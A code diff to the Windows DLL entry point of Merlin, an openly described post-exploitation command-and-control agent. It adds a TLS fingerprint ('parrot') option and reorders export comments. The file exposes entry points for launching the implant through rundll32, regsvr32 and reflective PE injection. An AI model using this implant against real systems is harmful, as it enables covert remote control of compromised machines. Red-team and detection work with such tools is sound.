@@ -1,3 +1,4 @@
+//go:build windows && cgo
 // +build windows,cgo
 
 // Merlin is a post-exploitation command and control framework.
@@ -42,6 +43,7 @@ var maxretry = "7"
 var padding = "4096"
 var opaque []byte
 var protocol = "h2"
+var parrot = ""
 
 func main() {}
 
@@ -54,10 +56,7 @@ func run(URL string) {
 		KillDate: killdate,
 		MaxRetry: maxretry,
 	}
-	a, err := agent.New(agentConfig)
-	if err != nil {
-		os.Exit(1)
-	}
+	a := agent.New(agentConfig)
 
 	// Get the client
 	var errClient error
@@ -69,6 +68,7 @@ func run(URL string) {
 		UserAgent:   useragent,
 		PSK:         psk,
 		JA3:         ja3,
+		Parrot:      parrot,
 		Padding:     padding,
 		AuthPackage: "opaque",
 		Opaque:      opaque,
@@ -87,9 +87,10 @@ func run(URL string) {
 
 // EXPORTED FUNCTIONS
 
-//export Run
 // Run is designed to work with rundll32.exe to execute a Merlin agent.
 // The function will process the command line arguments in spot 3 for an optional URL to connect to
+//
+//export Run
 func Run() {
 	// If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,Run"
 	if len(os.Args) >= 3 {
@@ -100,29 +101,34 @@ func Run() {
 	run(url)
 }
 
-//export VoidFunc
 // VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
+//
+//export VoidFunc
 func VoidFunc() { run(url) }
 
-//export DllInstall
 // DllInstall is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /n /i merlin.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
 // TODO add support for passing Merlin server URL with /i:"https://192.168.1.100:443" merlin.dll
+//
+//export DllInstall
 func DllInstall() { run(url) }
 
-//export DllRegisterServer
-// DLLRegisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s merlin.dll)
+// DllRegisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s merlin.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
+//
+//export DllRegisterServer
 func DllRegisterServer() { run(url) }
 
-//export DllUnregisterServer
-// DLLUnregisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /u merlin.dll)
+// DllUnregisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /u merlin.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
+//
+//export DllUnregisterServer
 func DllUnregisterServer() { run(url) }
 
-//export Merlin
 // Merlin is an exported function that takes in a C *char, converts it to a string, and executes it.
 // Intended to be used with DLL loading
+//
+//export Merlin
 func Merlin(u *C.char) {
 	if len(C.GoString(u)) > 0 {
 		url = C.GoString(u)
